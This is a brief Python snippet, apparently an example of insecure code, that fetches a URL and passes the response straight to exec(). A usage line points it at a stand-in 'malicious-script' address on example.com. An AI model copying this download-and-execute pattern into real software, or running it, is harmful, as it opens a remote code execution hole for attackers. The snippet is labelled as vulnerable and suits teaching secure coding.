import requests

def fetch_and_execute_url(url):
    response = requests.get(url)
    if response.status_code == 200:
        exec(response.text)  # Vulnerable code: executing fetched content directly
    else:
        print("Failed to fetch URL")

# Usage
url = "https://example.com/malicious-script"
fetch_and_execute_url(url)